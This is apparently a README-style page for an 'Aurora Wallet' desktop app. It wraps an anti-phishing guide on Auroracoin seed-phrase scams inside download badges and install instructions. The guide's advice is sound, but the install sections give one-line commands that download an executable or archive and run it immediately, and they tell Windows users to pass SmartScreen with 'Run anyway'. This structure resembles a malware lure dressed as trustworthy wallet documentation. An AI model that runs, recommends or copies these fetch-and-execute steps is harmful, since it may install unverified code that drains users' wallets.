![Aurora Wallet phishing and seed scams guide](assets/aurora-wallet-guide-article-banner.png)

# How to spot and avoid Auroracoin phishing and seed scams

The three messages that arrive before every seed theft, and the sentence that ends them.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


No support person, developer or Foundation member will ever ask for your recovery phrase, and that sentence settles most cases.

Phishing works by borrowing authority. A message claims to be from support, from the wallet team or from a person who helped you in a forum, and it asks for a small action that leads to your words. The words are the wallet, so the request is the theft.

<!-- ARTICLE-BODY-BEGIN -->

## The messages to expect

The first is fake support. You post about a sync problem, and a reply offers a private fix through a message, usually within minutes and with a sense of urgency.

The second is a lookalike site. A page copies the wallet project and asks you to validate or sync your wallet by entering the phrase. No legitimate wallet asks for a phrase anywhere except its own restore screen, inside the application you installed.

The third is an offer. A bonus, an airdrop, a migration reward or a compromised-wallet warning, always with a deadline and always with a form.

## What to do with each

1. Do not reply to the message. A reply confirms an active target.
2. Do not open the link, and do not install anything offered in a message.
3. Close the conversation and report the account where the platform allows it.
4. Check the project's own pages for any announcement, rather than the message.
5. If you already entered the phrase, move the balance to a new wallet immediately.

Moving the balance is the only action that helps after a phrase is exposed. Create a new wallet on a clean machine, write the new phrase on paper and send the balance to it, as <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">restoring from a phrase</a> describes for the new machine.

## Habits that prevent the request

Keep your phrase off screens. Never type it into a browser, a chat, a note app or a cloud document, and never photograph it. If someone asks for it in any form, the conversation is over, whatever title they claim.

Downloads come from one place: the release page of the wallet repository. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md">Spotting fake downloads</a> lists the domain tricks, and the genuine installer set is on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> page.

Treat urgency as evidence rather than motivation. A real network problem survives an hour of caution; a scam does not.

## FAQ

### What if the message comes from an account I follow?

Accounts get copied and taken over. Identity in a message is not identity of the sender.

### Can antivirus catch a phishing page?

Sometimes, and never reliably. The rule about never entering the phrase is the control that always works.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Spot fake wallet downloads](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
- [Password encryption](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/34-password-encryption.md)
- [Aurora Wallet FAQ](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/38-aurora-wallet-faq.md)
